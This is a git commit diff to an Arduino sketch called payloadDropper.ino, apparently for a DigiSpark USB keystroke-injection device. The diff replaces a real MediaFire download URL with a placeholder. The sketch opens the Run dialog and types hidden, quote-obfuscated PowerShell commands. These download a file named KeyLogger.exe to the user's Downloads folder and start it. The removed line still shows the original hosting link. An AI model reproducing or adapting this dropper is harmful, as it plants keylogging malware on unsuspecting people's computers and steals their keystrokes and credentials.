0649321efb1b4b50d7c8ef2b99e14787b5b1b646
Enzo0721 <38281095+Enzo0721@users.noreply.github.com>
2022-03-29 03:00:24 -0500

    Update payloadDropper.ino

--- payloadDropper.ino
+++ payloadDropper.ino
@@ -8,7 +8,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(500);
-  DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"https://download1081.mediafire.com/9fr7zs654fbg/qk4m7h52dxy9yov/KeyLogger.exe\\\",\\\"$env:UserProfile\\downloads\\KeyLogger.exe\\\");"));
+  DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"(download link)\\\",\\\"$env:UserProfile\\downloads\\KeyLogger.exe\\\");"));
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.println(F("powershell -windowstyle hidden -command cd downloads; Start-Process KeyLogger.exe"));
